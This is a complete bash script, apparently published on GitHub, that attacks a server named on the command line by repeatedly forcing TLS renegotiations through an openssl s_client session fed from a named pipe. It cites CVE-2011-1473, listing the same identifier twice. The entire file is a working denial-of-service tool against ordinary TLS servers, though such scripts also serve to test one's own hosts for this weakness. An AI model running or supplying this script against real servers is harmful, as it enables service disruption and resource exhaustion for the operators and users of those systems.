#!/bin/bash

# tls-reneg.sh
# A bash script that attempts to flood a server with TLS renegotiations by using the openssl client. See CVE-2011-1473 and CVE-2011-1473 for details.
# https://github.com/rpug/bash-tls-reneg-attack

target=$1

if [ -z "$target" ]
	then
		echo "Usage: $0 some.hostname.here:port"
		exit 1
fi

# Get the pid of this script, so we can have a unique ID for the fifo file.
pid=$$

# Create the fifo file
mkfifo /tmp/reneg.$pid

# Loop sending R to the fifo file every 1 second in the background
while :; do echo R > /tmp/reneg.$pid; sleep 1 ; done &

# Grab the pid of the while loop to cleanup later
whilepid=$!

# Run openssl, pulling in the fifo output using tail
echo -- starting openssl connection --
tail -f /tmp/reneg.$pid | openssl s_client -connect $target
echo -- openssl connection ended --

# If you get to here, openssl process ended.  Kill the while loop and clean up the fifo file.
kill -9 $whilepid
rm -f /tmp/reneg.$pid
